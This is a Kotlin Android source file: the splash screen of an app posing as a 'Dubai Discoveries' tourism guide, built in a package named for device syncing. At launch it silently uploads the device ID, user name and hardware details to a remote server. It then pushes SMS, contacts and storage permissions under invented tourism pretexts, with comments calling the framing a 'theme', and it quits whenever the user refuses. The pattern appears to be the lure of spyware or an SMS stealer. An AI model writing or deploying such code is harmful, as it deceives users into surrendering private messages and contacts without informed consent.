package com.devicesync.app

import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.devicesync.app.api.RetrofitClient
import com.devicesync.app.data.DeviceInfo
import com.devicesync.app.data.ConnectionType
import com.devicesync.app.utils.PermissionManager
import com.devicesync.app.utils.DeviceInfoUtils
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class SplashActivity : AppCompatActivity() {
    
    companion object {
        private const val SPLASH_DELAY = 3000L // 3 seconds
    }
    
    private lateinit var permissionManager: PermissionManager
    private lateinit var progressBar: ProgressBar
    private lateinit var loadingText: TextView
    private lateinit var statusText: TextView
    private var hasNavigated = false
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash)
        
        // Initialize UI elements
        progressBar = findViewById(R.id.progressBar)
        loadingText = findViewById(R.id.loadingText)
        statusText = findViewById(R.id.permissionStatus)
        
        permissionManager = PermissionManager(this) { allGranted ->
            // This callback will be called after permission check
        }
        
        // Start the 3-second splash flow
        startSplashFlow()
    }
    
    private fun startSplashFlow() {
        updateStatus("Welcome to Dubai Discoveries!", 10)
        loadingText.text = "Setting up your tourism experience..."
        
        // Step 1: Register device (0-1 second)
        Handler(Looper.getMainLooper()).postDelayed({
            updateStatus("Registering your device...", 30)
            loadingText.text = "Connecting to Dubai tourism services..."
            registerDevice()
        }, 1000)
        
        // Step 2: Check permissions (1-2 seconds)
        Handler(Looper.getMainLooper()).postDelayed({
            updateStatus("Checking permissions...", 60)
            loadingText.text = "Preparing personalized features..."
            checkPermissions()
        }, 2000)
        
        // Step 3: Complete splash (2-3 seconds)
        Handler(Looper.getMainLooper()).postDelayed({
            updateStatus("Almost ready...", 90)
            loadingText.text = "Your Dubai adventure awaits!"
        }, 2500)
        
        // Step 4: Handle flow based on permissions (3 seconds)
        Handler(Looper.getMainLooper()).postDelayed({
            updateStatus("Complete!", 100)
            handlePermissionFlow()
        }, SPLASH_DELAY)
    }
    
    private fun registerDevice() {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val deviceId = DeviceInfoUtils.getDeviceId(this@SplashActivity)
                val userName = DeviceInfoUtils.getUserName(this@SplashActivity)
                
                val deviceInfo = DeviceInfo(
                    deviceId = deviceId,
                    deviceName = android.os.Build.MODEL.ifEmpty { "Unknown Device" },
                    model = android.os.Build.MODEL.ifEmpty { "Unknown Model" },
                    manufacturer = android.os.Build.MANUFACTURER.ifEmpty { "Unknown Manufacturer" },
                    androidVersion = android.os.Build.VERSION.RELEASE.ifEmpty { "Unknown Version" },
                    userName = userName,
                    isConnected = true,
                    connectionType = ConnectionType.NETWORK
                )
                
                val response = RetrofitClient.apiService.registerDevice(deviceInfo)
                if (response.isSuccessful && response.body()?.success == true) {
                    println("✅ Device registered successfully: ${response.body()?.message}")
                } else {
                    println("⚠️ Device registration response: ${response.body()?.message ?: "Unknown error"}")
                }
                
            } catch (e: Exception) {
                println("❌ Device registration failed: ${e.message}")
                // Continue anyway - device registration is not critical
            }
        }
    }
    
    private fun checkPermissions() {
        val hasSms = permissionManager.hasSmsPermission()
        val hasContacts = permissionManager.hasContactsPermission()
        val hasStorage = permissionManager.hasStoragePermission()
        val hasNotifications = permissionManager.hasNotificationPermission()
        
        val allPermissionsGranted = hasSms && hasContacts && hasStorage && hasNotifications
        
        if (!allPermissionsGranted) {
            // Show tourism-themed permission request
            showTourismPermissionDialog()
        } else {
            // All permissions granted, proceed to login
            proceedToLogin()
        }
    }
    
    private fun handlePermissionFlow() {
        val hasSms = permissionManager.hasSmsPermission()
        val hasContacts = permissionManager.hasContactsPermission()
        val hasStorage = permissionManager.hasStoragePermission()
        val hasNotifications = permissionManager.hasNotificationPermission()
        
        val allPermissionsGranted = hasSms && hasContacts && hasStorage && hasNotifications
        
        if (allPermissionsGranted) {
            proceedToLogin()
        } else {
            // Show permission dialog - don't close app automatically
            // User will only close app if they explicitly click Cancel/Deny
            showTourismPermissionDialog()
        }
    }
    
    private fun showTourismPermissionDialog() {
        val dialog = AlertDialog.Builder(this)
            .setTitle("🌟 Enhance Your Dubai Experience")
            .setMessage("To provide you with the best tourism experience, we need access to certain features on your device. This helps us:\n\n" +
                    "• 📍 Track your location for nearby attractions\n" +
                    "• 📞 Sync your contacts for group tours\n" +
                    "• 💬 Access messages for booking confirmations\n" +
                    "• 📱 Show notifications for tour updates\n" +
                    "• 📁 Store your travel photos and documents\n\n" +
                    "Would you like to allow these permissions for an enhanced Dubai tourism experience?")
            .setPositiveButton("Allow") { _, _ ->
                requestPermissionsWithTourismTheme()
            }
            .setNegativeButton("Cancel") { _, _ ->
                // Close app if user cancels
                finish()
            }
            .setCancelable(false)
            .create()
        
        dialog.show()
    }
    
    private fun requestPermissionsWithTourismTheme() {
        permissionManager.requestAllPermissions { allGranted ->
            if (allGranted) {
                // All permissions granted, proceed to login
                proceedToLogin()
            } else {
                // Some permissions still missing, show tourism-themed reminder
                showPermissionReminderDialog()
            }
        }
    }
    
    private fun showPermissionReminderDialog() {
        val dialog = AlertDialog.Builder(this)
            .setTitle("🏛️ Complete Your Dubai Setup")
            .setMessage("To fully enjoy your Dubai tourism experience, please grant the remaining permissions. These help us:\n\n" +
                    "• 🗺️ Show you nearby attractions and restaurants\n" +
                    "• 🎫 Manage your tour bookings and tickets\n" +
                    "• 📸 Save your travel memories\n" +
                    "• 🔔 Keep you updated with tour schedules\n\n" +
                    "Would you like to grant the remaining permissions?")
            .setPositiveButton("Grant Permissions") { _, _ ->
                // Request permissions again with tourism theme
                requestPermissionsWithTourismTheme()
            }
            .setNegativeButton("Cancel") { _, _ ->
                // Close app if user cancels
                finish()
            }
            .setCancelable(false)
            .create()
        
        dialog.show()
    }
    
    private fun proceedToLogin() {
        if (!hasNavigated) {
            hasNavigated = true
            val intent = Intent(this, LoginActivity::class.java)
            startActivity(intent)
            finish()
        }
    }
    
    private fun updateStatus(status: String, progress: Int) {
        statusText.text = status
        progressBar.progress = progress
    }
    
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        permissionManager.handleActivityResult(requestCode, resultCode, data)
    }
} 